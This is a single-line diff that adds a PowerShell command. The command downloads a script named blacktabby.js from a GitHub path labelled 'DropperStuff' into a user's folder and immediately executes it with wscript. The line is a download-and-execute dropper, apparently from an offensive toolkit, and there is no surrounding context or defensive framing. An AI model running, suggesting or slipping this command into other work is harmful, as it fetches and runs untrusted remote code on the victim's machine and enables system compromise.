@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/latortuga71/Black_Tabby/master/DropperStuff/blacktabby.js", "C:\\Users\chris\blacktabby.js");wscript blacktabby.js
